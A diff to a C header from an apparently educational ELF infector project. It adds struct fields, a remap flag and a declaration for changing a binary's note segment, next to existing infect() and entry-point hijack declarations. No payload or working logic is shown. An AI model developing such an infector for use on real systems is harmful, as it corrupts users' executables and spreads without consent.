@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 12:23:53 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/06 11:00:21 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -50,6 +50,8 @@ typedef struct elf_data {
 	size_t		signature_offset;
 	size_t		infection_offset;
 	size_t		original_entry_point;
+	size_t		mmap_size;
+	size_t		original_eof;
 }	elf_data;
 
 #define DT_UNKNOWN  0   // Unknown file type
@@ -71,6 +73,8 @@ typedef struct elf_data {
 #define PT_PHDR		6
 #define PT_TLS		7
 
+#define MREMAP_MAYMOVE	1
+
 #include "asm_macros.h"
 
 #define SIGNATURE_OFFSET	32
@@ -85,6 +89,9 @@ bool		infect(profiling *this, const str path);
 
 //	Profiling
 profiling	get_profiling(byte *start_rip);
+
+//	Note segment
+bool		change_note_segment(profiling *this, elf_data *data);
 
 //	return.s
 void		the_point_of_no_return(bool original);
